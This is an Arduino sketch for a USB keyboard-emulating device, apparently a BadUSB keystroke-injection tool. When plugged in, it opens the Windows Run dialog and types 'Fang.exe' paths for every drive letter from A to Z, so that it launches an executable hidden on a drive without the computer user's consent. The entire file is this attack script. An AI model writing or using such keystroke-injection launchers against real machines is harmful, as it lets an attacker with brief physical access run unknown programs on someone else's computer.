#include <Keyboard.h> 

// Init function
void setup()
{
 char i;
  
  // Begining the stream
  Keyboard.begin();

  // Waiting 500ms for init
  delay(500);

  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();
  delay(500);


  /*Keyboard.print("Notepad");
  delay(300);
  typeKey(KEY_RETURN);
  delay(250);
  */
  for(i='A' ; i<='Z' ; i++ ){
    delay(300);
    Keyboard.print(i);
    delay(200);
    Keyboard.print(":\\Fang.exe");
    delay(200);
    typeKey(KEY_RETURN);
    delay(300);
    typeKey(KEY_RETURN);
    delay(300);
        
       
      }
  }

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

// Unused
void loop() {}
